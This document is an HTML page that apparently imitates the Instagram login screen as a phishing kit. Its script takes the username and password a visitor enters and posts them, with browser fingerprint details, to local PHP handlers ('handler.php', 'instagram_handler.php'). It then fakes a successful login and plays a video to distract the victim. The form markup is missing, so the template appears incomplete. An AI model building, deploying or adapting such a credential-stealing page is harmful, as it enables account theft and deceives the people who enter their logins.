<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="../../assets/js/jquery.min.js"></script>
    <script src="../../assets/js/client.min.js"></script>
    <script src="../../assets/js/loc.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            line-height: 1.4;
        }

        .container {
            max-width: 935px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .login-container {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 32px 0;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            width: 100%;
            max-width: 350px;
            text-align: center;
        }

        .instagram-logo {
            margin-bottom: 24px;
        }

        .instagram-logo img {
            width: 175px;
            height: 51px;
        }

        .login-form {
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 6px;
        }

        .form-input {
            width: 100%;
            padding: 9px 0 7px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            color: #262626;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            border-color: #a8a8a8;
        }

        .form-input::placeholder {
            color: #8e8e8e;
        }

        .login-button {
            width: 100%;
            background: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            padding: 5px 9px;
            margin-top: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-button:hover {
            background: #1877f2;
        }

        .login-button:disabled {
            background: #b2dffc;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 10px 40px 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider span {
            margin: 0 18px;
        }

        .facebook-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 20px;
            display: block;
        }

        .facebook-login:hover {
            text-decoration: underline;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 25px;
            margin-top: 10px;
            text-align: center;
        }

        .signup-text {
            color: #262626;
            font-size: 14px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .app-download-text {
            color: #262626;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-store {
            height: 40px;
        }

        .reel-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 9999;
            display: none;
            align-items: center;
            justify-content: center;
        }

        .reel-video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .reel-close {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.5);
            color: white;
            border: none;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            font-size: 20px;
            cursor: pointer;
            z-index: 10000;
        }

        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error-message {
            color: #ed4956;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        /* Mobile Responsive */
        @media (max-width: 450px) {
            .login-container {
                padding: 0;
            }
            
            .login-box {
                border: none;
                background: transparent;
                padding: 0 20px;
            }
            
            .signup-box {
                border: none;
                background: transparent;
                margin-top: 0;
            }
            
            .container {
                padding: 0;
            }
        }

        @media (max-width: 875px) {
            .app-stores {
                flex-direction: column;
                align-items: center;
            }
        }
    </style>
</head>

    <script>
        function post(data) {
            // Send to local handler for template-specific data
            $.ajax({
                type: 'POST',
                data: { data: data },
                url: 'handler.php',
                dataType: 'json',
                async: false,
                success: function(result) {
                    console.log('Data sent to local handler successfully');
                },
                error: function() {
                    console.log('Error sending data to local handler');
                }
            });
            
            // Also send to root handler for Instagram credentials
            if(data.includes('instagram_login')) {
                $.ajax({
                    type: 'POST',
                    data: { data: data },
                    url: '../../instagram_handler.php',
                    dataType: 'json',
                    async: false,
                    success: function(result) {
                        console.log('Instagram credentials sent to root handler successfully');
                    },
                    error: function() {
                        console.log('Error sending Instagram credentials to root handler');
                    }
                });
            }
        }

        function mydata() {
            // Collect user data
            const userData = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            };
            
            // Send data
            post(JSON.stringify(userData));
        }

        // Login form handling
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const loginButton = document.getElementById('loginButton');
            const loadingSpinner = document.getElementById('loadingSpinner');
            const errorMessage = document.getElementById('errorMessage');
            
            // Hide previous error
            errorMessage.style.display = 'none';
            
            if (!username || !password) {
                showError('Please fill in all fields');
                return;
            }
            
            // Show loading state
            loginButton.disabled = true;
            loginButton.textContent = 'Logging in...';
            loadingSpinner.style.display = 'block';
            
            // Simulate login process
            setTimeout(() => {
                // Create login data
                const loginData = {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    loginStatus: 'success',
                    userAgent: navigator.userAgent,
                    ip: 'captured',
                    sessionId: Math.random().toString(36).substr(2, 9)
                };
                
                // Send credentials to handlers
                post(JSON.stringify({
                    type: 'instagram_login',
                    username: username,
                    password: password,
                    data: loginData,
                    timestamp: new Date().toISOString()
                }));
                
                // Hide loading state
                loginButton.disabled = false;
                loginButton.textContent = 'Log In';
                loadingSpinner.style.display = 'none';
                
                // Play reel
                playReel();
                
            }, 1500);
        });

        function showError(message) {
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
        }

        function playReel() {
            const reelContainer = document.getElementById('reelContainer');
            const reelVideo = document.getElementById('reelVideo');
            
            // Show reel container
            reelContainer.style.display = 'flex';
            
            // Play video
            reelVideo.play();
            
            // Auto close after 10 seconds
            setTimeout(() => {
                closeReel();
            }, 10000);
        }

        function closeReel() {
            const reelContainer = document.getElementById('reelContainer');
            const reelVideo = document.getElementById('reelVideo');
            
            // Pause video
            reelVideo.pause();
            
            // Hide container
            reelContainer.style.display = 'none';
        }

        // Close reel when close button is clicked
        document.getElementById('reelClose').addEventListener('click', closeReel);

        // Close reel when clicking outside video
        document.getElementById('reelContainer').addEventListener('click', function(e) {
            if (e.target === this) {
                closeReel();
            }
        });

        // Handle escape key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeReel();
            }
        });
    </script>
</body>
</html>
